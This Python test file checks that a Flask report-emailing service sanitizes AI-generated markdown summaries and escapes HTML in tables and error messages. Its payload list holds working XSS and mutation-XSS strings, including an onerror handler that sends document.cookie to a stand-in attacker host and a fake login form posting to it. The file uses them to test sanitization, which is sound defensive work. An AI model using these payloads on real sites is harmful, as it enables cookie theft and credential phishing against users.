import re
import pytest
from flask import Flask, request

import main

app = Flask(__name__)

DANGEROUS_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '<img src="x" onerror="document.location=\'https://evil.example/?c=\'+document.cookie">',
    '<a href="javascript:alert(1)">Click to view full report</a>',
    '<a href="https://evil.example/login">Verify account</a>',
    '[Phishing Link](https://evil.example/phish)',
    '[JS Link](javascript:alert(1))',
    '<form action="https://evil.example/harvest" method="post"><input name="u"><input type="password" name="p"><input type="submit" value="Sign In"></form>',
    '<iframe src="https://evil.example/frame"></iframe>',
    '<svg onload="alert(1)"><script>alert(2)</script></svg>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<style>body{display:none}</style>',
    '<p onclick="alert(1)" style="color:red">Styled click text</p>',
    '<strong onmouseover="alert(1)">Hover bold</strong>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
    '<!--<img src="--><img src=x onerror=alert(1)//">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<p><<script>alert(1)//<</script>',
]

DISALLOWED_PATTERNS = [
    '<script',
    '<img',
    '<a ',
    '<a>',
    '<form',
    '<input',
    '<iframe',
    '<svg',
    '<meta',
    '<style',
    'onerror=',
    'onload=',
    'onclick=',
    'onmouseover=',
    'javascript:',
    'href=',
    'action=',
    'https://evil.example',
]


def _assert_no_dangerous_html(rendered: str):
    lowered = rendered.lower()
    for pattern in DISALLOWED_PATTERNS:
        assert pattern not in lowered, f'Found disallowed pattern {pattern!r} in {rendered!r}'
    # No HTML attributes should remain on any rendered tag inside sanitized output.
    for tag_attrs in re.findall(r'<[a-zA-Z0-9]+([^>]*)>', rendered):
        assert tag_attrs.strip() == '', f'Unexpected attributes {tag_attrs!r} in {rendered!r}'


def test_safe_markdown_preserves_benign_formatting():
    md = (
        '# Report Heading\n\n'
        'Summary with **bold** and *italic* and `inline_code`.\n\n'
        '- First item\n'
        '- Second item\n\n'
        'Ordered steps:\n\n'
        '1. Step one\n'
        '2. Step two\n\n'
        '> Quoted note\n\n'
        '    code_block_line()'
    )
    rendered = main.safe_markdown(md)
    assert '<h1>Report Heading</h1>' in rendered
    assert '<strong>bold</strong>' in rendered
    assert '<em>italic</em>' in rendered
    assert '<code>inline_code</code>' in rendered
    assert '<ul>' in rendered and '<li>First item</li>' in rendered
    assert '<ol>' in rendered and '<li>Step one</li>' in rendered
    assert '<blockquote>' in rendered
    assert '<pre><code>' in rendered
    _assert_no_dangerous_html(rendered)


def test_safe_markdown_handles_empty_and_none():
    assert main.safe_markdown('') == ''
    assert main.safe_markdown(None) == ''


@pytest.mark.parametrize('payload', DANGEROUS_PAYLOADS)
def test_safe_markdown_strips_dangerous_html_and_mxss(payload):
    rendered = main.safe_markdown(f'Safe prefix **ok**\n\n{payload}')
    assert '<strong>ok</strong>' in rendered
    _assert_no_dangerous_html(rendered)


def test_action_execute_single_chunk_all_sanitizes_summary_and_preserves_markdown(
    monkeypatch, mocker
):
    monkeypatch.setenv('LOOKER_AUTH_TOKEN', 'test-secret')
    summary_md = (
        '## Key Insights\n\n'
        '- Revenue grew **15%**\n\n'
        + '\n'.join(DANGEROUS_PAYLOADS)
    )
    mocker.patch('main.model_with_limit_and_backoff', return_value=[summary_md])
    mock_email = mocker.patch('main.send_email')

    payload = {
        'attachment': {'data': '[{"region": "US", "sales": 100}]'},
        'data': {},
        'form_params': {
            'email': 'recipient@example.com',
            'question': 'Summarize',
            'row_or_all': 'all',
        },
    }

    with app.test_request_context(
        '/execute',
        method='POST',
        headers={'Authorization': 'Token token="test-secret"'},
        json=payload,
    ):
        resp = main.action_execute(request)

    assert resp.status_code == 200
    mock_email.assert_called_once()
    sent_html = mock_email.call_args.args[2]
    assert '<h2>Key Insights</h2>' in sent_html
    assert '<strong>15%</strong>' in sent_html

    content_section = sent_html.split('<div class="content">', 1)[1]
    summary_section = content_section.split('<br><h3>Source Data</h3>', 1)[0]
    _assert_no_dangerous_html(
        summary_section.replace('<div class="summary-card">', '')
        .replace('<div class="summary-title">Summary</div>', '')
        .replace('</div>', '')
    )


def test_action_execute_multi_chunk_all_sanitizes_reduced_and_batch_summaries(
    monkeypatch, mocker
):
    monkeypatch.setenv('LOOKER_AUTH_TOKEN', 'test-secret')
    batch_1 = '*Batch 1* <script>alert("b1")</script> <img src=x onerror=alert(1)>'
    batch_2 = '**Batch 2** <form action="https://evil.example/harvest"><input></form>'
    reduced = '## Exec\n\n- **Total** <a href="javascript:alert(1)">Link</a> <iframe src="https://evil.example"></iframe>'

    mocker.patch('main.model_with_limit_and_backoff', return_value=[batch_1, batch_2])
    mocker.patch('main.reduce', return_value=reduced)
    mock_email = mocker.patch('main.send_email')

    payload = {
        'attachment': {'data': '[{"row": 1}, {"row": 2}]'},
        'data': {},
        'form_params': {
            'email': 'recipient@example.com',
            'question': 'Summarize',
            'row_or_all': 'all',
        },
    }

    with app.test_request_context(
        '/execute',
        method='POST',
        headers={'Authorization': 'Token token="test-secret"'},
        json=payload,
    ):
        resp = main.action_execute(request)

    assert resp.status_code == 200
    mock_email.assert_called_once()
    sent_html = mock_email.call_args.args[2]

    assert '<h2>Exec</h2>' in sent_html
    assert '<strong>Total</strong>' in sent_html
    assert '<em>Batch 1</em>' in sent_html
    assert '<strong>Batch 2</strong>' in sent_html

    content_section = sent_html.split('<div class="content">', 1)[1]
    summaries_only = content_section.split('<br><h3>Source Data</h3>', 1)[0]
    for pattern in DISALLOWED_PATTERNS:
        assert pattern not in summaries_only.lower()


def test_action_execute_row_mode_escapes_html_in_table(monkeypatch, mocker):
    monkeypatch.setenv('LOOKER_AUTH_TOKEN', 'test-secret')
    mocker.patch(
        'main.model_with_limit_and_backoff',
        return_value=['<script>alert(1)</script><img src=x onerror=alert(1)>'],
    )
    mock_email = mocker.patch('main.send_email')

    payload = {
        'attachment': {'data': '[{"note": "<img src=x onerror=alert(2)>"}]'},
        'data': {},
        'form_params': {
            'email': 'recipient@example.com',
            'question': 'Analyze row',
            'row_or_all': 'row',
        },
    }

    with app.test_request_context(
        '/execute',
        method='POST',
        headers={'Authorization': 'Token token="test-secret"'},
        json=payload,
    ):
        resp = main.action_execute(request)

    assert resp.status_code == 200
    mock_email.assert_called_once()
    sent_html = mock_email.call_args.args[2]
    content_section = sent_html.split('<div class="content">', 1)[1]

    assert '<script' not in content_section.lower()
    assert '<img' not in content_section.lower()
    assert '&lt;script&gt;alert(1)&lt;/script&gt;' in content_section
    assert '&lt;img src=x onerror=alert(2)&gt;' in content_section


def test_action_execute_error_email_escapes_exception_html(monkeypatch, mocker):
    monkeypatch.setenv('LOOKER_AUTH_TOKEN', 'test-secret')
    mocker.patch(
        'main.model_with_limit_and_backoff',
        side_effect=RuntimeError(
            'Model <img src=x onerror=alert(1)> and <script>alert(2)</script> not found'
        ),
    )
    mock_email = mocker.patch('main.send_email')

    payload = {
        'attachment': {'data': '[{"col": "val"}]'},
        'data': {},
        'form_params': {
            'email': 'recipient@example.com',
            'question': 'Summarize',
            'row_or_all': 'all',
        },
    }

    with app.test_request_context(
        '/execute',
        method='POST',
        headers={'Authorization': 'Token token="test-secret"'},
        json=payload,
    ):
        resp = main.action_execute(request)

    assert resp.status_code == 200
    mock_email.assert_called_once()
    sent_html = mock_email.call_args.args[2]
    content_section = sent_html.split('<div class="content">', 1)[1]

    assert '<img' not in content_section.lower()
    assert '<script' not in content_section.lower()
    assert '&lt;img src=x onerror=alert(1)&gt;' in content_section
    assert '&lt;script&gt;alert(2)&lt;/script&gt;' in content_section
